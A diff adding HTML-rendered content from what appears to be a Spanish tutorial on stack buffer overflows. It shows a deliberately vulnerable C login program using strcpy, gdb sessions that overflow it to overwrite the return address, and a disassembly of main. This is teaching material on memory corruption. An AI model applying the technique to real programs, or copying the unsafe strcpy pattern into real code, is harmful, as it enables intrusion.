+   &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;brillig&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strcmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;outgrabe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;auth_flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+     &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: %s n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+ &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_authentication&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;n-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;      Acceso concedido.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+       &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-=-=-=-=-=-=-=-=-=-=-=-=-=-n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;nAcceso denegado.n&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Al estar declaradas en este orden, no podemos modificar la variable &lt;em&gt;auth_flag&lt;/em&gt; desbordando el buffer:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gdb -q auth_overflow2.c.binary
+Using host libthread_db library &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lib/tls/i686/cmov/libthread_db.so.1&amp;#34;&lt;/span&gt;.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; at 0x8048421: file auth_overflow2.c, line 9.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; b &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+Breakpoint &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; at 0x804846f: file auth_overflow2.c, line 16.
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/hkr/booksrc/auth_overflow2.c.binary
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:9
+&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;               strcpy&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;password_buffer, password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7e0:
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;�o������b����o���G���20205�04bb����204�04b�����20205�04bh��������02&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000      0xb7fd6ff4      0xbffff8a0      0xbffff808
+0xbffff7ec:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff808
+0xbffff7fc:     0x080484bb      0xbffff9f8      0x08048510      0xbffff868
+0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Breakpoint 2, check_authentication &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xbffff9f8 &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    at auth_overflow2.c:16
+&lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;              &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; auth_flag&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/s password_buffer
+0xbffff7e0:      &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &amp;lt;repeats&amp;gt;
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/x &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     0x00000000
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/16xw &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;auth&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;_flag
+0xbffff7dc:     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x00000000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    0x41414141      0x41414141      0x41414141
+0xbffff7ec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff7fc:     0x08004141      0xbffff9f8      0x08048510      0xbffff868
+0xbffff80c:     0xb7eafebc      0x00000002      0xbffff894      0xbffff8a0
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Seguimos pasos similares a los de antes, con la diferencia de que ahora &lt;em&gt;auth_flag&lt;/em&gt; está situada en memoria antes que &lt;em&gt;password_buffer&lt;/em&gt;, como podemos comprobar en la salida de &lt;em&gt;x/16xw &amp;amp;auth;_flag&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;auth_flag&lt;/em&gt; está almacenada en la dirección 0xbffff7dc y su valor está entre paréntesis, &lt;em&gt;password_buffer&lt;/em&gt; comienza inmediatamente despues en 0xbffff7e0.&lt;/p&gt;
+&lt;p&gt;Si terminamos la ejecución del programa nos encontraremos con esto:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004141 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;No hemos sobrescrito &lt;em&gt;auth_flag&lt;/em&gt;, en su lugar hemos sobrescrito un punto crítico del programa que obliga a finalizar su ejecución inesperadamente.&lt;/p&gt;
+&lt;p&gt;Para entender lo que ha pasado es necesaria una breve explicación de cómo se forman los ejecutables. Durante la ejecución de un programa existe una estructura de datos llamada pila (o stack) que se usa para para mantener el flujo de ejecución de un programa y el contexto de las variables locales durante las llamadas a funciones. Cuando se realiza una llamada a una función, una estructura llamada cuadro de pila (stack frame) se introduce en la pila, y el registro EIP (Registro que apunta a la intrucción actual a ejecutar) salta a la primera línea de la función. Cuando ésta acaba, el registro EIP debe volver a apuntar a la siguiente instrucción despues de la llamada a la función, la dirección de dicha instrucción se guarda en el cuadro de pila de la función. En nuestro caso, cuando estamos en la función &lt;em&gt;check_authtentication&lt;/em&gt; se guarda la dirección de retorno a la que apuntará EIP cuando finalize y vuelva al main. El error de segmentación que hemos obtenido a sido al sobreescribir dicha dirección de retorono al desbordar el buffer, con lo cual el programa salta a una dirección aleatoria y finaliza ya que se sale de su segmento.&lt;/p&gt;
+&lt;p&gt;Si echamos un vistazo código ensamblador de la función main podemos averiguar cual es la dirección que debe guardarse en el cuadro de pila de &lt;em&gt;check_authtentication&lt;/em&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;err&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;gdb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;disass&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;Dump&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048474&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048475&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048477&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x8&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804847a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;and&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0xfffffff0&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804847d&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x0&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048482&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048484&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;cmp&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x1&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048488&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;jg&lt;/span&gt;     &lt;span class=&#34;mh&#34;&gt;0x80484ab&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848d&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804848f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x08048493&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x80485e5&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804849a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804831c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0804849f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x0&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484a6&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x804833c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ab&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;DWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x080484ae&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;add&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x4&lt;/span&gt;
